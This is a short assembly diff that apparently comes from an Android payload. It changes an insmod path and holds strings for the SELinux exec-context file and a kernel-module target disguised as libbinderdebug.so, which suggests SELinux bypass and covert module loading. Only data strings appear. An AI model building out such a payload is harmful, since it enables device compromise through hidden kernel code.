@@ -19,7 +19,7 @@ selinux_ctx_end:
 attr_exec:
     .asciz "/proc/self/attr/exec"
 exe_path:
-    .asciz "/vendor/bin/insmod"
+    .asciz "/system/bin/insmod"
 ko_target:
     .ascii "/vendor/lib64/libbinderdebug.so\0"
     .skip 32, 0                             /* pad to 64 bytes — longest candidate path */
